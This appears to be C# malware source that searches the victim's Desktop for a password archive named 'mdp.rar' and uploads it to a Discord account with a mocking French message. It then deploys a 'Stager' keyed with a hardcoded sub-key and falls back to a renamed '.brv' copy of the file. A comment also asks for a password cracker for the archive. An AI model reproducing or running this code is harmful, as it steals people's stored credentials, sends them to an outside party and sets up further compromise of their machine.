using System;
using System.IO;

namespace FileSearch
{
    class Program
    {   

        // 4 caracters in password of the archive, need a c# password cracker

        private static string SearchFile(string fileName)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            foreach (string file in Directory.GetFiles(path))
            {
                if (Path.GetFileName(file) == fileName)
                    return file;
            }
            return null;
        }

        private static string FileToBase64String(string path)
        {
            Byte[] bytes = File.ReadAllBytes(path);
            return Convert.ToBase64String(bytes);
        }



        private static string subKey = "Kitty Flower";
        static void Main()
        {
            string path = SearchFile("mdp.rar");
            if (path != null)
            {
                #region oldCode
                //Console.WriteLine("File found!");
                //string path = SearchFile("mdp.rar");
                //string result = FileToBase64String(path);
                //Console.WriteLine("Splitting string " + result.Length + " long");
                //List<string> splitedResult = Utils.SplitString(result, 20);
                //if (splitedResult != null)
                //{
                //    string temp = "";
                //    foreach (string line in splitedResult)
                //        temp = temp + line;
                //    Console.WriteLine(temp == result ? "Passed" : "Failed");
                //    if(temp == result)
                //    {
                //        Console.WriteLine("Sending data..");


                //    }
                //    else
                //    {
                //        Console.WriteLine("Cannot send data!");
                //    }
                //}
                //else
                //    Console.WriteLine("Failed to split string!");     
                #endregion
                DiscordUtils.SendFile("Voici vos fichiers mon seigneur :joy: <@300184779846844417>", "mdp.rar", "rar", path, "");
                Stager stager = new Stager(subKey, path, false);
                stager.Deploy();
            }
            else
            {
                // If file not found, try to find the zing zonged one, and open the stager with same sub-key
                string pathSecond = SearchFile("mdp.rar.brv");
                if (pathSecond != null)
                {
                    Stager stager = new Stager(subKey, pathSecond, true);
                    stager.Deploy();
                }

            }

        }
    }
}
